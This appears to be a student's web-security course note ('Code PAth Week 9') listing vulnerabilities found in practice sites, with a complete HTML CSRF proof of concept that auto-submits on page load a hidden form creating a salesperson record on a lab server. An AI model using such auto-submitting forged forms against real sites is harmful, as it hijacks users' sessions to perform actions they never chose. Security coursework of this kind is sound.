#Code PAth Week 9

<br>##Blue
  <br>sql injection
  <br>session hijacking
<br>##Green
  <br>xss

<br>##Red
  <br>csrf
  ````````
<!doctype html>
<html lang="en">
    <body onload="document.createElement('form').submit.call(document.getElementById('csrf_form'))">
    <form id="csrf_form" name="csrf_form" action="https://35.184.88.145/red/public/staff/salespeople/new.php" method="post">
    <input type="hidden" name="csrf_token" value="randomstringheredontmindme" />
    <input type="hidden" name="first_name" value="round5" />

    <input type="hidden" name="last_name" value="fight" />

    <input type="hidden" name="phone" value="2-2-2-2" />

    <input type="hidden" name="email" value="wdadda@gmail.com" />
    <input id="submit" type="hidden" name="submit" value="Create"  />
  </form>
</html>
